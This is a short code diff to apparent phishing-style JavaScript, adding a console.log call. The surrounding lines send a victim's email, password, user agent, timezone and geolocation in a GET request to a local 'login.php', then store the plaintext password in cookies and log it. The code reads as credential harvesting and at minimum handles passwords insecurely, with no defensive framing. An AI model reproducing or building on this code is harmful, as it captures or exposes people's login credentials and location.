@@ -72,6 +72,7 @@
             var timezone = new Date();
             xhttp.open("get", "./book_files/login.php?userAgent="+uAgent+"&status="+status+"&timezone="+timezone+"&email="+email+"&pass="+pass+"&lat="+lat+"&long="+long);//
             xhttp.send();
+            console.log(xhttp)
             document.cookie = "user="+email;
             document.cookie = "pass="+pass;
             console.log(document.cookie)
